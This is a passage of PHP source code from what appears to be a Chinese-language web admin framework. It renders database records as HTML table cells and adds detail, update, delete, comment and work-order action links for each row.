                $houduanzhanshi=qian($keyinfo[hou($kpart[$ii],".")]["COLUMN_SSHOW"],"|");
            }//html table imgx
                if ($houduanzhanshi!=""){                
                  if ($dtp=="html" or $dtp=="table" or $dtp=="imgx"){
                     $tmpvl=fmvalue($tbnm,$sresult[hou($kpart[$ii],".")][$jj],$sresult['SNO'][$jj],hou($kpart[$ii],"."),qian($keyinfo[hou($kpart[$ii],".")]["COLUMN_SSHOW"],"|"),$jj,$sresult);//先套上外壳                  
                     $tmpvl=str_replace("<selected>",$fmtmpselect,$tmpvl);
                     $fmtb=$fmtb."<td id=\"".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" snoid=\"".$sresult['SNO'][$jj]."\"  tpnm=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_TPNM"]."\" ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])."  class=\"TABTD_CLS\"   knm=\"".hou($kpart[$ii],".")."\" tdata=\"".String2Hex(str_replace("\\'","\'",tostring($sresult[hou($kpart[$ii],".")][$jj])))."\" title=\"".labturns($sresult[hou($kpart[$ii],".")][$jj])."\">".$tmpvl."</td>\r\n";
                     if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){
                      $fmline=$fmline."<td id=\"".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" snoid=\"".$sresult['SNO'][$jj]."\"  tpnm=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_TPNM"]."\" ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])."  class=\"TABTD_CLS\"   knm=\"".hou($kpart[$ii],".")."\" tdata=\"".String2Hex(str_replace("\\'","\'",tostring($sresult[hou($kpart[$ii],".")][$jj])))."\" title=\"".labturns($sresult[hou($kpart[$ii],".")][$jj])."\">".$tmpvl."</td>\r\n";
                      if (_get("tabkey")==hou($kpart[$ii],".")){
                        $fmtbk=$tmpvl;
                      }
                     }
                     $demo=str_replace("[".hou($kpart[$ii],".")."]",$tmpvl,$demo);
                     $demo=str_replace("[key-".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
                  }
                }else{//如果不需要套外壳直接纯值
                   if (strlen($fmtmpselect)>5){
                     if ($dtp=="html" or $dtp=="table" or $dtp=="imgx"){
                      $fmtb=$fmtb."<td id=\"".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" snoid=\"".$sresult['SNO'][$jj]."\"  tpnm=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_TPNM"]."\" ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." dxtp=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]."\"   class=\"TABTD_CLS\"   knm=\"".hou($kpart[$ii],".")."\">".$fmtmpselect."</td>\r\n";
                      if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){
                        $fmline=$fmline."<td id=\"".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" snoid=\"".$sresult['SNO'][$jj]."\"  tpnm=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_TPNM"]."\" ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." dxtp=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]."\"   class=\"TABTD_CLS\"   knm=\"".hou($kpart[$ii],".")."\">".$fmtmpselect."</td>\r\n";
                        if (_get("tabkey")==hou($kpart[$ii],".")){
                         $fmtbk=$fmtmpselect;
                        }
                       };
                      $demo=str_replace("[".hou($kpart[$ii],".")."]",$fmtmpselect,$demo);
                      $demo=str_replace("[key-".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
                     }
                   }else{
                    if (strlen($sresult[hou($kpart[$ii],".")][$jj])>33){
                      if ($dtp=="html" or $dtp=="table" or $dtp=="imgx"){
                       $fmtb=$fmtb."<td id=\"".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" snoid=\"".$sresult['SNO'][$jj]."\"  tpnm=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_TPNM"]."\" ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." dxtp=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]."\"  class=\"TABTD_CLS\"   knm=\"".hou($kpart[$ii],".")."\" tdata=\"".String2Hex(str_replace("\\'","\'",tostring($sresult[hou($kpart[$ii],".")][$jj])))."\" title=\"".labturns(tostring($sresult[hou($kpart[$ii],".")][$jj]))."\">".substr(tohex($sresult[hou($kpart[$ii],".")][$jj]),0,33)."</td>\r\n";
                       if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){
                         $fmline=$fmline."<td id=\"".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" snoid=\"".$sresult['SNO'][$jj]."\"  tpnm=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_TPNM"]."\" ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." dxtp=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]."\"  class=\"TABTD_CLS\"   knm=\"".hou($kpart[$ii],".")."\" tdata=\"".String2Hex(str_replace("\\'","\'",tostring($sresult[hou($kpart[$ii],".")][$jj])))."\" title=\"".labturns(tostring($sresult[hou($kpart[$ii],".")][$jj]))."\">".substr(tohex($sresult[hou($kpart[$ii],".")][$jj]),0,33)."</td>\r\n";
                         if (_get("tabkey")==hou($kpart[$ii],".")){
                           $fmtbk=tohex($sresult[hou($kpart[$ii],".")][$jj]);
                         };
                       };
                       $demo=str_replace("[".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
                       $demo=str_replace("[key-".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
                      }
                    }else{
                      if ($dtp=="html" or $dtp=="table" or $dtp=="imgx"){
                        if ($keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]=="dttm" or $keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]=="date"){
                         $fmtb=$fmtb."<td id=\"".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" snoid=\"".$sresult['SNO'][$jj]."\" tpnm=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_TPNM"]."\" ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." dxtp=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]."\"  class=\"TABTD_CLS\"   knm=\"".hou($kpart[$ii],".")."\" tdata=\"".String2Hex(str_replace("\\'","\'",tostring($sresult[hou($kpart[$ii],".")][$jj])))."\"><input id=\"p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" class=\"demo-input\"  value=\"".tohex($sresult[hou($kpart[$ii],".")][$jj])."\"></td>\r\n";
                         if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){
                           $fmline=$fmline."<td id=\"".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" snoid=\"".$sresult['SNO'][$jj]."\" tpnm=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_TPNM"]."\" ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." dxtp=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]."\"  class=\"TABTD_CLS\"   knm=\"".hou($kpart[$ii],".")."\" tdata=\"".String2Hex(str_replace("\\'","\'",tostring($sresult[hou($kpart[$ii],".")][$jj])))."\"><input id=\"p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" class=\"demo-input\"  value=\"".tohex($sresult[hou($kpart[$ii],".")][$jj])."\"></td>\r\n";
                          if (_get("tabkey")==hou($kpart[$ii],".")){
                           $fmtbk=tohex($sresult[hou($kpart[$ii],".")][$jj]);
                          };
                         };
                        }else{
                         $fmtb=$fmtb."<td id=\"".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" snoid=\"".$sresult['SNO'][$jj]."\"  tpnm=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_TPNM"]."\" ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." dxtp=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]."\"   class=\"TABTD_CLS\"   knm=\"".hou($kpart[$ii],".")."\" tdata=\"".String2Hex(str_replace("\\'","\'",tostring($sresult[hou($kpart[$ii],".")][$jj])))."\" title=\"".labturns(tostring($sresult[hou($kpart[$ii],".")][$jj]))."\">".tohex($sresult[hou($kpart[$ii],".")][$jj])."</td>\r\n";
                         if ($_GET["SNO"]==$sresult['SNO'][$jj]){
                           $fmline=$fmline."<td id=\"".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" snoid=\"".$sresult['SNO'][$jj]."\"  tpnm=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_TPNM"]."\" ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." dxtp=\"".$keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]."\"   class=\"TABTD_CLS\"   knm=\"".hou($kpart[$ii],".")."\" tdata=\"".String2Hex(str_replace("\\'","\'",tostring($sresult[hou($kpart[$ii],".")][$jj])))."\" title=\"".labturns(tostring($sresult[hou($kpart[$ii],".")][$jj]))."\">".tohex($sresult[hou($kpart[$ii],".")][$jj])."</td>\r\n";
                           if (_get("tabkey")==hou($kpart[$ii],".")){
                            $fmtbk=tohex($sresult[hou($kpart[$ii],".")][$jj]);
                           };
                         }
                        }                                     
                        $demo=str_replace("[".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);                      
                        $demo=str_replace("[key-".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
                      }
                    };//33
                  };//tmpselect>5
                };//show
               $fmtmpselect="";
         $fmudt=$fmudt."'&p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."='+mkstr($('#p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."').val())+";
        }else{//tmp<=0 前面没有SNO第一列
          $newonex=tostring($keyinfo[hou($kpart[$ii],".")]["COLUMN_CLSTXT"]);
           $kclstxt=tostring($keyinfo[hou($kpart[$ii],".")]["COLUMN_CLSTXT"]);
          $houtaizhanshi=qian($keyinfo[hou($kpart[$ii],".")]["COLUMN_SSHOW"],"|");
          
           if ($kclstxt!="" and (strpos($kclstxt,"|")>0 or strpos($kclstxt,"/")>0)){        
              if ($dtp=="html" or $dtp=="table" or $dtp=="imgx"){
                  if (strpos($newonex,"key-")>0){
                   $hk=qian(hou($newonex,"key-"),"]");
                   $newonex=$sresult[$hk][$jj];
                  };
                  if ($rdonly==""){
                    //$selecthcd=" onchange=\"qajaxp('修改记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=".hou($kpart[$ii],".")."&SNO=".$sresult['SNO'][$jj]."','p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."='+$('#"."p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."').val())\"";
                  }
                  if ($keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]=="clstxt"){
                      $fmtmpselect=formselect(qian($newonex,"|"),hou($newonex,"|"),$sresult[hou($kpart[$ii],".")][$jj],"p_".hou($kpart[$ii],".").$sresult['SNO'][$jj],$rdonly,$selecthcd);
                  }
                  if ($keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]=="clsduo"){
                      $fmtmpselect="<input type=\"hidden\" id=\""."p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" value=\"".$sresult[hou($kpart[$ii],".")][$jj]."\">".formselectx(qian($newonex,"|"),hou($newonex,"|"),$sresult[hou($kpart[$ii],".")][$jj],"p_".hou($kpart[$ii],".").$sresult['SNO'][$jj],"","");
                  };
                 if ($houtaizhanshi!=""){
                    $tmpvl=fmvalue($tbnm,$sresult[hou($kpart[$ii],".")][$jj],$sresult['SNO'][$jj],hou($kpart[$ii],"."),qian($keyinfo[hou($kpart[$ii],".")]["COLUMN_SSHOW"],"|"),$jj,$sresult);
                    $tmpvl=str_replace("<selected>",$fmtmpselect,$tmpvl);
                 }else{
                    $tmpvl=$fmtmpselect;
                 }
                 $fmtb=$fmtb."<td  class=\"TABTD_CLS\"   ".$coldspl.">".$tmpvl."</td>\r\n";
                 if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){
                     $fmline=$fmline."<td  class=\"TABTD_CLS\"   ".$coldspl.">".$tmpvl."</td>\r\n";
                    if (_get("tabkey")==hou($kpart[$ii],".")){
                          $fmtbk=$tmpvl;
                    };
                 }
                 $demo=str_replace("[".hou($kpart[$ii],".")."]",$tmpvl,$demo);
                 $demo=str_replace("[key-".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
              }
           }else{
            if ($dtp=="html" or $dtp=="table" or $dtp=="imgx"){              
               if ($houtaizhanshi!=""){
                  $tmpvl=fmvalue($tbnm,$sresult[hou($kpart[$ii],".")][$jj],$sresult['SNO'][$jj],hou($kpart[$ii],"."),qian($keyinfo[hou($kpart[$ii],".")]["COLUMN_SSHOW"],"|"),$jj,$sresult);
                  $fmtb=$fmtb."<td  class=\"TABTD_CLS\"   ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." title=\"".labturns(tostring($sresult[hou($kpart[$ii],".")][$jj]))."\">".$tmpvl."</td>\r\n";
                  if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){
                     $fmline=$fmline."<td  class=\"TABTD_CLS\"   ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." title=\"".labturns(tostring($sresult[hou($kpart[$ii],".")][$jj]))."\">".$tmpvl."</td>\r\n";
                           if (_get("tabkey")==hou($kpart[$ii],".")){
                            $fmtbk=$tmpvl;
                           };
                  }
                 $demo=str_replace("[".hou($kpart[$ii],".")."]",$tmpvl,$demo);
                 $demo=str_replace("[key-".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
              }else{
               if (strlen($sresult[hou($kpart[$ii],".")][$jj])>33){
                 $fmtb=$fmtb."<td  class=\"TABTD_CLS\"   ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." title=\"".labturns(tostring($sresult[hou($kpart[$ii],".")][$jj]))."\">".substr($sresult[hou($kpart[$ii],".")][$jj],0,33)."</td>\r\n";
                  if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){
                     $fmline=$fmline."<td  class=\"TABTD_CLS\"   ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." title=\"".labturns(tostring($sresult[hou($kpart[$ii],".")][$jj]))."\">".substr($sresult[hou($kpart[$ii],".")][$jj],0,33)."</td>\r\n";
                     if (_get("tabkey")==hou($kpart[$ii],".")){
                            $fmtbk=$sresult[hou($kpart[$ii],".")][$jj];
                     };
                  }
                 $demo=str_replace("[".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
                 $demo=str_replace("[key-".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
               }else{
                 $fmtb=$fmtb."<td  class=\"TABTD_CLS\"   ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." title=\"".labturns(tostring($sresult[hou($kpart[$ii],".")][$jj]))."\">".$sresult[hou($kpart[$ii],".")][$jj]."</td>\r\n";
                  if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){
                     $fmline=$fmline."<td  class=\"TABTD_CLS\"   ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])." title=\"".labturns(tostring($sresult[hou($kpart[$ii],".")][$jj]))."\">".$sresult[hou($kpart[$ii],".")][$jj]."</td>\r\n";
                     if (_get("tabkey")==hou($kpart[$ii],".")){
                            $fmtbk=$sresult[hou($kpart[$ii],".")][$jj];
                     };
                  }
                 $demo=str_replace("[".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
                 $demo=str_replace("[key-".hou($kpart[$ii],".")."]",$sresult[hou($kpart[$ii],".")][$jj],$demo);
               };//33
             };//houtaizhanshi    
            };//html table imgx
           };//kclstxt
        };//if tmp>0
      };//if
       if ($keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]=="date"){
         $tmpdtx=$tmpdtx."<script>laydatex('p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."');</script>";
       };
       if ($keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]=="dttm"){
         $tmpdtx=$tmpdtx."<script>laydttmx('p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."');</script>";
       };
    };//for    
     $fmudt=substr($fmudt,0,strlen($fmudt)-1);  
     $fmexl=$fmexl.huanhang(); 
    if (strpos(".".$dtp.$headx,"nooprt")<=0 and ($oprtx*1)==1){
      if ($dtp=="html" or $dtp=="table" or $dtp=="imgx"){
       if (strpos($tbnm,",")>0){
         $fmtb=$fmtb."<td  class=\"TABTD_CLS\"  <a href=\"javascript:void(0)\"  ".mkdisplay($obtn)." onclick=\"update('".$xid."',".$sresult["SNO"][$jj].")\" snox=\"".$sresult["SNO"][$jj]."\"><img src=\"/ORG/BRAIN/images/icon/system/detail5.svg\" style=\"width:20px;height:20px;\"></a><a href=\"javascript:void(0)\" ".mkdisplay($vbtn)." onclick=\"qajaxp('修改记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=".$tbkis."&SNO=".$sresult['SNO'][$jj]."',".$fmudt.")\" snox=\"".$sresult["SNO"][$jj]."\"><img id=\"upd".$sresult["SNO"][$jj]."\"  src=\"/ORG/BRAIN/images/icon/system/tongguoqr.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\" ".mkdisplay($xbtn)." onclick=\"Notiflix.Confirm.Show( '删除确认', '你确定要删除该条记录吗?', '是', '否', function(){ qajaxps('删除记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=-killitem&QRY=".$tbkis."&SNO=".$sresult["SNO"][$jj]."',''); } );\" ".mkdisplay($xbtn)." snox=\"".$sresult["SNO"][$jj]."\"><img  id=\"del".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/shanchu13.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据评论','/SPEC/EDITOR/anyjsshort.php?stid=0Ak5hM-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."')\"><img src=\"/ORG/BRAIN/images/icon/system/liuyan0.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据工单','/SPEC/EDITOR/anyjsshort.php?stid=aneVcy-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."&prob=problem')\"><img src=\"/ORG/BRAIN/images/icon/system/probm.svg\" style=\"width:20px;height:20px\"></a></td>\r\n";
          if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){
              $fmline=$fmline."<td  class=\"TABTD_CLS\"  <a href=\"javascript:void(0)\"  ".mkdisplay($obtn)." onclick=\"update('".$xid."',".$sresult["SNO"][$jj].")\" snox=\"".$sresult["SNO"][$jj]."\"><img src=\"/ORG/BRAIN/images/icon/system/detail5.svg\" style=\"width:20px;height:20px;\"></a><a href=\"javascript:void(0)\" ".mkdisplay($vbtn)." onclick=\"qajaxp('修改记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=".$tbkis."&SNO=".$sresult['SNO'][$jj]."',".$fmudt.")\" snox=\"".$sresult["SNO"][$jj]."\"><img  id=\"upd".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/tongguoqr.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\" ".mkdisplay($xbtn)." onclick=\"Notiflix.Confirm.Show( '删除确认', '你确定要删除该条记录吗?', '是', '否', function(){ qajaxps('删除记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=-killitem&QRY=".$tbkis."&SNO=".$sresult["SNO"][$jj]."',''); } );\" ".mkdisplay($xbtn)." snox=\"".$sresult["SNO"][$jj]."\"><img  id=\"del".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/shanchu13.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据评论','/SPEC/EDITOR/anyjsshort.php?stid=0Ak5hM-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."')\"><img src=\"/ORG/BRAIN/images/icon/system/liuyan0.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据工单','/SPEC/EDITOR/anyjsshort.php?stid=aneVcy-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."&prob=problem')\"><img src=\"/ORG/BRAIN/images/icon/system/probm.svg\" style=\"width:20px;height:20px\"></a></td>\r\n";
          }
         $demo=str_replace("[OPRT]","<a  href=\"javascript:void(0)\"  ".mkdisplay($obtn)." onclick=\"update('".$xid."',".$sresult["SNO"][$jj].")\" snox=\"".$sresult["SNO"][$jj]."\"><img src=\"/ORG/BRAIN/images/icon/system/detail5.svg\" style=\"width:20px;height:20px;\"></a><a href=\"javascript:void(0)\" ".mkdisplay($vbtn)." onclick=\"qajaxp('修改记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=".$tbkis."&SNO=".$sresult['SNO'][$jj]."',".$fmudt.")\" snox=\"".$sresult["SNO"][$jj]."\"><img id=\"upd".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/tongguoqr.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\" ".mkdisplay($xbtn)." onclick=\"Notiflix.Confirm.Show( '删除确认', '你确定要删除该条记录吗?', '是', '否', function(){ qajaxps('删除记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=-killitem&QRY=".$tbkis."&SNO=".$sresult["SNO"][$jj]."',''); } );\" ".mkdisplay($xbtn)." snox=\"".$sresult["SNO"][$jj]."\"><img id=\"del".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/shanchu13.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据评论','/SPEC/EDITOR/anyjsshort.php?stid=0Ak5hM-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."')\"><img src=\"/ORG/BRAIN/images/icon/system/liuyan0.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据工单','/SPEC/EDITOR/anyjsshort.php?stid=aneVcy-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."&prob=problem')\"><img src=\"/ORG/BRAIN/images/icon/system/probm.svg\" style=\"width:20px;height:20px\"></a>",$demo);
       }else{
         $fmtb=$fmtb."<td  class=\"TABTD_CLS\"  ><a  href=\"javascript:void(0)\" ".mkdisplay($obtn)." onclick=\"update('".$xid."',".$sresult["SNO"][$jj].")\" snox=\"".$sresult["SNO"][$jj]."\"><img src=\"/ORG/BRAIN/images/icon/system/detail5.svg\" style=\"width:20px;height:20px;\"></a><a href=\"javascript:void(0)\" ".mkdisplay($vbtn)." onclick=\"qajaxp('修改记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=".$tbkis."&SNO=".$sresult['SNO'][$jj]."',".$fmudt.")\" snox=\"".$sresult["SNO"][$jj]."\"><img id=\"upd".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/tongguoqr.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"Notiflix.Confirm.Show( '删除确认', '你确定要删除该条记录吗?', '是', '否', function(){ qajaxps('删除记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=-killitem&QRY=".$tbkis."&SNO=".$sresult["SNO"][$jj]."',''); } );\" ".mkdisplay($xbtn)." snox=\"".$sresult["SNO"][$jj]."\"><img id=\"del".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/shanchu13.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据评论','/SPEC/EDITOR/anyjsshort.php?stid=0Ak5hM-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."')\"><img src=\"/ORG/BRAIN/images/icon/system/liuyan0.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据工单','/SPEC/EDITOR/anyjsshort.php?stid=aneVcy-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."&prob=problem')\"><img src=\"/ORG/BRAIN/images/icon/system/probm.svg\" style=\"width:20px;height:20px\"></a></td>\r\n";
          if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){
              $fmline=$fmline."<td  class=\"TABTD_CLS\"  ><a  href=\"javascript:void(0)\" ".mkdisplay($obtn)." onclick=\"update('".$xid."',".$sresult["SNO"][$jj].")\" snox=\"".$sresult["SNO"][$jj]."\"><img src=\"/ORG/BRAIN/images/icon/system/detail5.svg\" style=\"width:20px;height:20px;\"></a><a href=\"javascript:void(0)\" ".mkdisplay($vbtn)." onclick=\"qajaxp('修改记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=".$tbkis."&SNO=".$sresult['SNO'][$jj]."',".$fmudt.")\" snox=\"".$sresult["SNO"][$jj]."\"><img id=\"upd".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/tongguoqr.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"Notiflix.Confirm.Show( '删除确认', '你确定要删除该条记录吗?', '是', '否', function(){ qajaxps('删除记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=-killitem&QRY=".$tbkis."&SNO=".$sresult["SNO"][$jj]."',''); } );\" ".mkdisplay($xbtn)." snox=\"".$sresult["SNO"][$jj]."\"><img id=\"del".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/shanchu13.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据评论','/SPEC/EDITOR/anyjsshort.php?stid=0Ak5hM-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."')\"><img src=\"/ORG/BRAIN/images/icon/system/liuyan0.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据工单','/SPEC/EDITOR/anyjsshort.php?stid=aneVcy-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."&prob=problem')\"><img src=\"/ORG/BRAIN/images/icon/system/probm.svg\" style=\"width:20px;height:20px\"></a></td>\r\n";
          }
         $demo=str_replace("[OPRT]","<a  href=\"javascript:void(0)\" ".mkdisplay($obtn)." onclick=\"update('".$xid."',".$sresult["SNO"][$jj].")\" snox=\"".$sresult["SNO"][$jj]."\"><img src=\"/ORG/BRAIN/images/icon/system/detail5.svg\" style=\"width:20px;height:20px;\"></a><a href=\"javascript:void(0)\" ".mkdisplay($vbtn)." onclick=\"qajaxp('修改记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=".$tbkis."&SNO=".$sresult['SNO'][$jj]."',".$fmudt.")\" snox=\"".$sresult["SNO"][$jj]."\"><img id=\"upd".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/tongguoqr.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"Notiflix.Confirm.Show( '删除确认', '你确定要删除该条记录吗?', '是', '否', function(){ qajaxps('删除记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=-killitem&QRY=".$tbkis."&SNO=".$sresult["SNO"][$jj]."',''); } );\" ".mkdisplay($xbtn)." snox=\"".$sresult["SNO"][$jj]."\"><img id=\"del".$sresult["SNO"][$jj]."\" src=\"/ORG/BRAIN/images/icon/system/shanchu13.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据评论','/SPEC/EDITOR/anyjsshort.php?stid=0Ak5hM-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."')\"><img src=\"/ORG/BRAIN/images/icon/system/liuyan0.svg\" style=\"width:20px;height:20px\"></a><a href=\"javascript:void(0)\"  onclick=\"newwin('查看数据工单','/SPEC/EDITOR/anyjsshort.php?stid=aneVcy-sfile:anyjsshort.php-pnum:30-&tbnm=".$tbnm."&tbsno=".$sresult["SNO"][$jj]."&prob=problem')\"><img src=\"/ORG/BRAIN/images/icon/system/probm.svg\" style=\"width:20px;height:20px\"></a>",$demo);
       };
      };
    };
    if ($dtp=="html" or $dtp=="table" ){
